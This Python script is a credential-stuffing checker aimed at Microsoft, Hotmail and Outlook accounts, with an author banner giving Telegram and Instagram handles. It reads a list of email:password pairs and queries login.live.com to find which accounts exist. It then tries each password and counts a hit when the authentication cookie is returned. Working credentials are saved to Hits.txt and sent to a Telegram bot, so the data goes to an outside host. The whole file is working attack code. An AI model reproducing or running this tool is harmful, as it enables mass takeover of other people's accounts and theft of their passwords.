import requests
from uuid import uuid4
import re
import time
import os
from user_agent import generate_user_agent

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] YouTube    : {B}| أحمد الحراني
|{Z}[+] TeleGram  : {B} maho_s9    |
|{Z}[+] Instagram  : {B}ahmedalharrani |
|{Z}[+] Tool  : {B} Checker Microsoft |
|{Z}[+] Other  : {B} CC , Xbox, Hotmail, outlook, gmail , yahoo |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')

token = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + Z)


def checkHotmail(folo, email, password, opid, cobrandid, id_value, uaid, correlation_id, cookies):
    global hit, bad
    tim = int(time.time())

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': generate_user_agent(),
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    params = {
        'contextid': correlation_id,
        'opid': opid,
        'bk': tim,
        'uaid': uaid,
        'pid': '0',
    }

    data = f'ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={folo}&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}'

    req = requests.post('https://login.live.com/ppsecure/post.srf', params=params, cookies=cookies, headers=headers, data=data).cookies.get_dict()
    if '__Host-MSAAUTH' in req:
        hit += 1
        tlg = f"""
𝐇𝐢 𝐘𝐨𝐮 𝐇𝐚𝐯𝐞 𝐠𝐨𝐭 𝐇𝐢𝐭 Microsoft ..!🔰

𝐄𝐦𝐚𝐢𝐥 ==> {email}
𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {password}

𝐁𝐘 : @maho_s9 ==> 𝐂𝐇 : @maho9s
"""
        print(F + tlg)
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{password}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        with open('Hits.txt', 'a') as x:
            x.write(f'{email}:{password}\n')
    else:
        bad += 1
        print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{password}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")

def iferorrcokies():
    try:
        AH = requests.post(
            f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1715872213&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%{uuid4()}&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
            headers={'User-Agent': generate_user_agent()},
        )
        u = AH.text
        cookies = AH.cookies.get_dict()

        correlation_id_match = re.search(r"correlationId:'([a-f0-9\-]+)'", u)
        correlation_id = correlation_id_match.group(1) if correlation_id_match else None

        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', u)
        ppft = ppft_match.group(1) if ppft_match else None

        opid_match = re.search(r'opid=([a-fA-F0-9]+)', u)
        opid = opid_match.group(1) if opid_match else None

        id_match = re.search(r'id=([0-9]+)', u)
        id_value = id_match.group(1) if id_match else None

        cobrandid_match = re.search(r'cobrandid=([0-9]+)', u)
        cobrandid = cobrandid_match.group(1) if cobrandid_match else None

        uaid_match = re.search(r'uaid=([a-f0-9\-]+)', u)
        uaid = uaid_match.group(1) if uaid_match else None

        try:
            os.remove('micrsoftCoki.txt')
            os.remove('micrsoftother.txt')
        except:
            pass

        with open('micrsoftCoki.txt', 'a') as f:
            f.write(str(cookies) + '\n')
        with open('micrsoftother.txt', 'a') as t:
            t.write(uaid + "|" + cobrandid + "|" + id_value + "|" + opid + "|" + ppft + "|" + correlation_id + '\n')

    except Exception as e:
        print(e)
        iferorrcokies()


def Check(email, password):
    global uus, bss, hit, bad
    try:
        try:
            with open("micrsoftother.txt", "r") as f:
                for line in f:
                    uaid, cobrandid, id_value, opid, ppft, correlation_id = line.strip().split('|')
            with open("micrsoftCoki.txt", "r") as t:
                for line in t:
                    cookies = eval(line.strip())
        except:
            iferorrcokies()
            with open("micrsoftother.txt", "r") as f:
                for line in f:
                    uaid, cobrandid, id_value, opid, ppft, correlation_id = line.strip().split('|')
            with open("micrsoftCoki.txt", "r") as t:
                for line in t:
                    cookies = eval(line.strip())

        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'Connection': 'keep-alive',
            'Content-type': 'application/json; charset=utf-8',
            'Origin': 'https://login.live.com',
            'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1715872213&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d189ea36b-989f-3dde-f8d0-83032ef5c2c3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': generate_user_agent(),
            'correlationId': correlation_id,
            'hpgact': '0',
            'hpgid': '33',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        params = {
            'opid': opid,
            'id': id_value,
            'cobrandid': cobrandid,
            'mkt': 'AR-YE',
            'lc': '9217',
            'uaid': uaid,
        }

        json_data = {
            'checkPhones': False,
            'country': '',
            'federationFlags': 3,
            'flowToken': ppft,
            'forceotclogin': False,
            'isCookieBannerShown': False,
            'isExternalFederationDisallowed': False,
            'isFederationDisabled': False,
            'isFidoSupported': True,
            'isOtherIdpSupported': True,
            'isRemoteConnectSupported': False,
            'isRemoteNGCSupported': True,
            'isSignup': False,
            'originalRequest': '',
            'otclogindisallowed': False,
            'uaid': uaid,
            'username': email,
        }

        response = requests.post(
            'https://login.live.com/GetCredentialType.srf',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
        )

        if '"IfExistsResult":0,' in response.text and "data" in response.text:
            folo = response.json()["Credentials"]["OtcLoginEligibleProofs"][0]["data"]           
            checkHotmail(folo, email, password, opid, cobrandid, id_value, uaid, correlation_id, cookies)            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{password}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        elif '"IfExistsResult":0,' in response.text:
            folo = ppft
            checkHotmail(folo, email, password, opid, cobrandid, id_value, uaid, correlation_id, cookies)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{password}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        elif '"IfExistsResult":1,' in response.text or '"IfExistsResult":2,' in response.text:
            bss += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{password}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        else:
            iferorrcokies()
            Check(email, password)
            
    except:
        iferorrcokies()
        Check(email, password)
        bss += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{M}__  __ _                           __ _{A}
{M}|  \/  (_)                         / _| |{A}
{M}| \  / |_  ___ _ __ ___  ___  ___ | |_| |_{A}
{M}| |\/| | |/ __| '__/ _ \/ __|/ _ \|  _| __|{A}
{M}| |  | | | (__| | | (_) \__ \ (_) | | | |_{A}
{M}|_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|{A}

━━━━━━━━━━━━━━━━━━━━━━━━━━
{F}𝐇𝐢𝐭𝐬 ==> {F}{hit}
{Z}𝐁𝐚𝐝𝐋𝐨𝐠𝐢𝐧 ==> {Z}{bad}
{B}𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {B}{uus}
{X}𝐍𝐨𝐭𝐅𝐨𝐮𝐧𝐝𝐔𝐬𝐞𝐫 ==> {X}{bss}
{A}𝐄𝐦𝐚𝐢𝐥 ==> {M}{email} | {A}𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ==> {M}{password}
━━━━━━━━━━━━━━━━━━━━━━━━━━
""")

def fileget():
    file = input('[+] ENTER Name of your list: ')
    print("_" * 60)
    try:
        with open(file, "r") as f:
            for line in f:
                email = line.strip().split(':')[0]
                password = line.strip().split(':')[1]
                Check(email, password)
    except FileNotFoundError:
        print("File not found. Please enter a valid file name.")
        fileget()

fileget()